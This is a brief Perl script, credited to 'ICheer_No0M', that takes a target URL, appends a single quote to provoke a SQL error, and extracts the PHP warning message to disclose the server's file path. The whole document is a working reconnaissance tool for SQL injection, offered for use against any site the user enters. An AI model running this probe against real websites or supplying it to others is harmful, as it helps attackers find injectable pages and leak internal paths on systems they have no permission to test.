# Find Error Path SQL Injection #
# Only Warning: :) #
# Code By ICheer_No0M #
use LWP::UserAgent;

print "[+] Input Target : ";
chomp($sqli=<stdin>);
unless ($sqli=~/^http:\/\//) {$sqli='http://'.$sqli;}
$target=$sqli."\'";
$content=LWP::UserAgent->new->get($target)->content;
if($content =~ /<b>Warning<\/b>:(.*).php/i) 
{
$path=$1;
$path=~s/<b>//;
print "\n[+] Found : Warning:".$path.".php\n\n";
}
else
{
print "\n[+] Cannot Find Error Path...\n\n";
}
print "[+] Done...";
